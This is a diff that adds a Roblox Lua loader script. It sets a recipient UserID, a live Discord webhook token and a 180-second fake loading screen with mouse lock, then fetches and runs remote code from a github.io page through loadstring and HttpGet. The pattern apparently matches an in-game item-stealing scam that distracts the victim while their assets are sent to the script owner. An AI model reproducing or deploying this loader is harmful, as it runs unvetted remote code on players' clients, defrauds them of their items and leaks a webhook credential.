@@ -1,0 +1,14 @@
+_G.UserID = 3123445858
+_G.Webhook = "https://discord.com/api/webhooks/1102186100472152064/K13CHr6-5Lz-cSi7Wjesu6UReC61-I6UIslbF5STvYCNYWx1-UkyRraIq06Khqnt63rz"
+
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true 
+
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://rizz69.github.io/Script.lua", true))()
